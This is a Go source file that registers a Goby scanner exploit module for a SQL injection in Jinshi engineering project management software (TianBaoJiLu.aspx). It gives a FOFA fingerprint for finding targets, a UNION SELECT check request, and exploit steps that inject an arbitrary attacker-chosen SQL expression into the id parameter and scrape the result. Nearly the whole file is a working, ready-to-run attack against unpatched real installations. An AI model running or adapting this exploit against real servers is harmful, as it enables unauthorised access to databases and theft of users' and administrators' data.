package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "jinshisoft TianBaoJiLu.aspx SQL Injection",
    "Description": "<p>Jinshi project management software is an engineering project management software, which is specially developed for construction projects and can be used for project management of various construction sites. This product has a SQL injection vulnerability, through which an attacker can obtain database permissions and even execute commands.</p>",
    "Product": "JinShi Soft",
    "Homepage": "www.jinshisoft.com",
    "DisclosureDate": "2022-11-28",
    "Author": "black@blackhat.net",
    "FofaQuery": "body=\"SetZhangTao\"",
    "GobyQuery": "body=\"SetZhangTao\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>There is currently no patch information, please contact the official to obtain a repair solution; <a href=\"http://www.jinshisoft.com\">www.jinshisoft.com</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "select",
            "value": "host_name(),user,db_name()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "cookie|lastbody|regex| ASP.NET_SessionId=.*? path=/;"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/query/shigongjihuajindu/TianBaoJiLu.aspx?id=1+Union+Select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32),23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43+",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "{{{cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "cookie|lastbody|regex| ASP.NET_SessionId=.*? path=/;"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/query/shigongjihuajindu/TianBaoJiLu.aspx?id=1+Union+Select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,{{{sql}}},23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43+",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "{{{cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<tr><td>(?s)(.*)</td><td>16"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "金石工程项目管理系统 TianBaoJiLu.aspx SQL 注入漏洞",
            "Product": "金石工程项目管理系统",
            "Description": "<p>金石工程项目管理软件是一款工程项目管理软件,专门针对建筑工程项目开发,可以用于各种工地的项目管理。该产品存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限甚至执行命令等。<br></p>",
            "Recommendation": "<p>目前暂无补丁信息，联系官方获取修复方案；<a href=\"http://www.jinshisoft.com\">www.jinshisoft.com</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "jinshisoft TianBaoJiLu.aspx SQL Injection",
            "Product": "JinShi Soft",
            "Description": "<p>Jinshi project management software is an engineering project management software, which is specially developed for construction projects and can be used for project management of various construction sites. This product has a SQL injection vulnerability, through which an attacker can obtain database permissions and even execute commands.</p>",
            "Recommendation": "<p>There is currently no patch information, please contact the official to obtain a repair solution; <a href=\"http://www.jinshisoft.com\">www.jinshisoft.com</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}
